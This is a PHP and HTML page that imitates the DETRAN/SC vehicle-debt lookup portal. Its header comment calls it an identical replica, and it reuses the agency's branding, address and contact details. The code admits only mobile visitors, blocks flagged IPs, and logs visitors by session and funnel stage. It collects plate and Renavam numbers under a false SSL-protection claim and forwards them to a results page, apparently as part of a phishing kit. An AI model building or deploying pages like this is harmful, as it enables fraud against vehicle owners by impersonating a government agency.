<?php
/**
 * Portal Detran SC - Consulta de Débitos (PHP)
 * Réplica idêntica do site departamentodetrans.auction
 */
require_once __DIR__ . '/config.php';

enforceIpNotBlocked();
enforceMobileOnly();

// Registrar visita anônima
$sessionId = $_COOKIE['visitor_session'] ?? null;
if (!$sessionId) {
    $sessionId = bin2hex(random_bytes(16));
    setcookie('visitor_session', $sessionId, time() + 86400, '/');
}
try {
    $pdo = getConnection();
    $ipHash = hash('sha256', getClientIpForBlock());
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    $check = $pdo->prepare("SELECT id FROM visitas_anonimas WHERE session_id = ?");
    $check->execute([$sessionId]);
    if ($check->fetch()) {
        $pdo->prepare("UPDATE visitas_anonimas SET ultimo_acesso = NOW(), pagina = 'index', etapa = 'inicio' WHERE session_id = ?")->execute([$sessionId]);
    } else {
        $pdo->prepare("INSERT INTO visitas_anonimas (id, session_id, ip_hash, user_agent, pagina, etapa) VALUES (UUID(), ?, ?, ?, 'index', 'inicio')")->execute([$sessionId, $ipHash, $ua]);
    }
    
    $checkClique = $pdo->prepare("SELECT id FROM estatisticas_cliques WHERE tipo = 'visita_index' AND session_id = ?");
    $checkClique->execute([$sessionId]);
    if (!$checkClique->fetch()) {
        $pdo->prepare("INSERT INTO estatisticas_cliques (tipo, session_id, ip_hash) VALUES ('visita_index', ?, ?)")->execute([$sessionId, $ipHash]);
    }
} catch (Exception $e) {}

header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: SAMEORIGIN');
header('X-XSS-Protection: 1; mode=block');
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Consultar Débitos do Veículo - DETRAN/SC</title>
  <meta name="description" content="Consulta de débitos e IPVA de veículos registrados em Santa Catarina.">
  <link rel="icon" type="image/png" href="assets/favicon-detran-sc.png">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Montserrat', Arial, sans-serif; background: #fff; color: #333; font-size: 15px; min-height: 100vh; display: flex; flex-direction: column; }
    
    .dsc-header { background: #fff; padding: 0 24px; border-bottom: 1px solid #eee; }
    .dsc-header-inner { max-width: 1200px; margin: 0 auto; display: flex; align-items: center; justify-content: space-between; padding: 14px 0; }
    .dsc-header-left { display: flex; align-items: center; gap: 16px; }
    .dsc-hamburger { background: none; border: none; font-size: 22px; color: #555; cursor: pointer; padding: 4px; }
    .dsc-logo { height: 48px; width: auto; }
    .dsc-header-title { font-size: 18px; font-weight: 400; color: #555; letter-spacing: 1px; }
    .dsc-dt { font-weight: 700; color: #333; }
    .dsc-nav { display: flex; align-items: center; gap: 20px; font-size: 14px; color: #555; }
    .dsc-header-right { display: flex; align-items: center; gap: 12px; font-size: 14px; color: #555; }
    .dsc-social-icon { display: flex; align-items: center; text-decoration: none; }
    .dsc-nav-divider { color: #ccc; }
    .dsc-sair { cursor: pointer; }
    .dsc-header-line { height: 3px; background: linear-gradient(90deg, #C4000B 0%, #C4000B 33%, #4CAF50 33%, #4CAF50 66%, #8BC34A 66%, #8BC34A 100%); }
    
    .dsc-main { flex: 1; padding: 40px 24px 80px; }
    .dsc-container { max-width: 700px; margin: 0 auto; }
    .dsc-back { display: flex; align-items: center; gap: 8px; font-size: 14px; margin-bottom: 24px; text-decoration: none; }
    .dsc-back-arrow { color: #C4000B; font-size: 16px; font-weight: 600; }
    .dsc-back-text { color: #C4000B; }
    .dsc-title { font-size: 26px; font-weight: 400; color: #333; margin: 0 0 24px; text-align: center; }
    .dsc-subtitle { font-size: 16px; font-weight: 300; text-transform: uppercase; color: #999; text-align: center; margin: 0 0 16px; letter-spacing: 1px; }
    .dsc-index-warning { text-align: center; font-size: 17px; color: #333; margin: 0 0 32px; line-height: 1.6; }
    
    .dsc-form { max-width: 500px; margin: 0 auto; display: flex; flex-direction: column; gap: 16px; }
    .dsc-input-wrap { position: relative; }
    .dsc-input { width: 100%; padding: 14px 16px; border: 1px solid #c1c1c1; border-radius: 8px; font-size: 14px; font-weight: 500; color: #333; background: #fff; outline: none; transition: border-color 0.2s; box-sizing: border-box; font-family: inherit; }
    .dsc-input:focus { border-color: #60a5fa; }
    .dsc-input::placeholder { color: #999; font-weight: 400; }
    .dsc-input-icon { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); }
    .dsc-hint { display: flex; align-items: flex-start; gap: 6px; font-size: 13px; color: #7a869a; margin-top: -6px; line-height: 1.2; }
    .dsc-hint-icon { flex-shrink: 0; margin-top: 1px; }
    .dsc-hint-copy { flex: 1; }
    .dsc-link { color: #6b7280; text-decoration: underline; font-size: 13px; }

    .dsc-renavam-info { background: #eef4fc; border-left: 4px solid #4a90d9; border-radius: 8px; padding: 16px 20px; font-size: 14px; color: #333; line-height: 1.6; }
    .dsc-renavam-info-title { font-weight: 700; color: #2563eb; margin: 0 0 4px; font-size: 15px; }
    .dsc-renavam-info p { margin: 0 0 8px; }
    .dsc-renavam-info ul { margin: 0 0 8px; padding-left: 20px; }
    .dsc-renavam-info li { margin-bottom: 2px; }
    .dsc-renavam-info-example { color: #6b9a3a; font-weight: 600; margin: 0; }
    
    .dsc-btn { width: 100%; padding: 12px; background: linear-gradient(90deg, #3a6a18 0%, #4a7a25 30%, #5a8a2a 60%, #6b9a3a 100%); color: #fff; border: none; border-radius: 6px; font-size: 14px; font-weight: 700; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; transition: opacity 0.2s; font-family: inherit; }
    .dsc-btn:hover { opacity: 0.9; }
    
    .dsc-ssl { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 13px; color: #888; margin-top: 4px; }
    
    .dsc-footer { background: #f0f0f0; padding: 40px 24px 0; text-align: center; margin-top: auto; }
    .dsc-footer-inner { display: flex; align-items: center; justify-content: center; gap: 24px; margin-bottom: 24px; max-width: 800px; margin-left: auto; margin-right: auto; }
    .dsc-footer-line { flex: 1; height: 1px; background: #ccc; }
    .dsc-footer-logo { height: 60px; width: auto; }
    .dsc-footer-title { font-size: 15px; font-weight: 700; color: #333; margin: 0 0 8px; }
    .dsc-footer-addr { font-size: 13px; color: #666; margin: 0 0 4px; }
    .dsc-footer-bottom { margin-top: 24px; padding: 12px 0; border-top: 1px solid #ddd; font-size: 13px; color: #555; }
    
    .dsc-loading-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center; z-index: 9999; }
    .dsc-loading-modal { background: #fff; padding: 32px 48px; border-radius: 12px; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.2); }
    .dsc-loading-text { margin: 0 0 16px; font-size: 16px; font-weight: 600; color: #333; }
    .dsc-spinner { width: 40px; height: 40px; border: 4px solid #eee; border-top-color: #4a7a25; border-radius: 50%; animation: dsc-spin 0.8s linear infinite; margin: 0 auto; }
    @keyframes dsc-spin { to { transform: rotate(360deg); } }
    
    @media (max-width: 768px) {
      .dsc-nav { display: none; }
      .dsc-header-right { display: none; }
      .dsc-header-title { font-size: 14px; }
      .dsc-main { padding: 28px 10px 60px; }
      .dsc-container { padding: 0; }
      .dsc-back { margin-bottom: 22px; }
      .dsc-title { font-size: 22px; line-height: 1.24; margin: 0 0 22px; }
      .dsc-subtitle { font-size: 14px; line-height: 1.45; max-width: 272px; margin: 0 auto 22px; }
      .dsc-index-warning { max-width: 312px; margin: 0 auto 26px; font-size: 13px; line-height: 1.7; }
      .dsc-form { max-width: 100%; }
      .dsc-hint { display: grid; grid-template-columns: auto 1fr auto; align-items: start; column-gap: 6px; }
      .dsc-hint-copy { min-width: 0; line-height: 1.15; }
      .dsc-link { max-width: 82px; text-align: right; line-height: 1.15; }
      .dsc-footer-logo { height: 50px; }
    }
  </style>
</head>
<body>
  <div class="dsc-loading-overlay" id="dscLoading" style="display:none">
    <div class="dsc-loading-modal">
      <p class="dsc-loading-text">Consultando débitos...</p>
      <div class="dsc-spinner"></div>
    </div>
  </div>

  <header class="dsc-header">
    <div class="dsc-header-inner">
      <div class="dsc-header-left">
        <button class="dsc-hamburger">☰</button>
        <img src="assets/detransc-logo.png" alt="DetranSC" class="dsc-logo">
        <span class="dsc-header-title"><span class="dsc-dt">DETRAN</span> DIGITAL</span>
      </div>
      <nav class="dsc-nav">
        <span>Serviços ▾</span>
        <span>Meus agendamentos</span>
        <span>Cadastrar empresa</span>
        <span>Meus cadastro</span>
        <span>Ajuda</span>
      </nav>
      <div class="dsc-header-right">
        <a href="#" class="dsc-social-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="#555"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg></a>
        <a href="#" class="dsc-social-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="#555"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
        <a href="#" class="dsc-social-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="#555"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg></a>
        <span class="dsc-nav-divider">|</span>
        <span class="dsc-sair">Sair</span>
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg>
      </div>
    </div>
    <div class="dsc-header-line"></div>
  </header>

  <main class="dsc-main">
    <div class="dsc-container">
      <a class="dsc-back" href="#">
        <span class="dsc-back-arrow">←</span>
        <span class="dsc-back-text">Voltar ao início</span>
      </a>

      <h1 class="dsc-title">Consultar Débitos do Veículo</h1>
      <h2 class="dsc-subtitle">CONSULTA DOSSIÊ VEÍCULO — DETRAN/SC</h2>
      <p class="dsc-index-warning">Atenção: Esta consulta é restrita a veículos registrados ou com infrações em Santa Catarina.</p>

      <form class="dsc-form" id="consultaForm" onsubmit="return handleConsultar(event)">
        <input type="text" class="dsc-input" placeholder="Placa" name="placa" maxlength="7" autocomplete="off" oninput="this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '')">
        
        <div class="dsc-input-wrap">
          <input type="text" class="dsc-input" placeholder="Renavam" name="renavam" id="renavamInput" maxlength="11" inputmode="numeric" autocomplete="off" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
          <div class="dsc-input-icon">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
          </div>
        </div>

        <div class="dsc-renavam-info" id="renavamInfo" style="display:none">
          <p class="dsc-renavam-info-title">O que é o Renavam?</p>
          <p>Número de <strong>9 a 11 dígitos</strong> que identifica seu veículo. Encontre-o no:</p>
          <ul>
            <li><strong>CRLV</strong> — Certificado de Registro e Licenciamento do Veículo</li>
            <li><strong>CRV</strong> — Documento do veículo (campo "RENAVAM")</li>
            <li>Boleto do IPVA ou licenciamento anual</li>
          </ul>
          <p class="dsc-renavam-info-example">Exemplo: 00123456789</p>
        </div>

        <p class="dsc-hint">
          <svg class="dsc-hint-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
          <span class="dsc-hint-copy">Renavam: número de 9 a 11 dígitos no CRLV.</span>
          <a href="#" class="dsc-link" onclick="event.preventDefault(); var el=document.getElementById('renavamInfo'); el.style.display = el.style.display==='none'?'block':'none';">Onde encontrar?</a>
        </p>

        <button type="submit" class="dsc-btn">CONSULTAR DOSSIÊ VEÍCULO</button>

        <p class="dsc-ssl">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#6b9a3a" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
          Seus dados são protegidos por criptografia SSL.
        </p>
      </form>
    </div>
  </main>

  <footer class="dsc-footer">
    <div class="dsc-footer-inner">
      <div class="dsc-footer-line"></div>
      <img src="assets/detransc-logo.png" alt="DetranSC" class="dsc-footer-logo">
      <div class="dsc-footer-line"></div>
    </div>
    <p class="dsc-footer-title">Departamento Estadual de Trânsito de Santa Catarina - DETRAN/SC</p>
    <p class="dsc-footer-addr">Av. Almirante Tamandaré - 480, Coqueiros, Florianópolis, SC CEP 88.080-160</p>
    <p class="dsc-footer-addr">Fone (48) 3664-1800 / centraldeinformacoes@detran.sc.gov.br</p>
    <div class="dsc-footer-bottom">
      <span>🔒 Política de Privacidade</span>
    </div>
  </footer>

  <script>
    function handleConsultar(e) {
      e.preventDefault();
      var renavam = document.getElementById('renavamInput').value.trim();
      var placa = document.querySelector('input[name="placa"]').value.trim();
      if (!renavam) { alert('Digite o Renavam'); return false; }
      document.getElementById('dscLoading').style.display = 'flex';
      setTimeout(function() {
        window.location.href = 'resultado-sc.php?renavam=' + encodeURIComponent(renavam) + '&placa=' + encodeURIComponent(placa);
      }, 1500);
      return false;
    }
  </script>
</body>
</html>
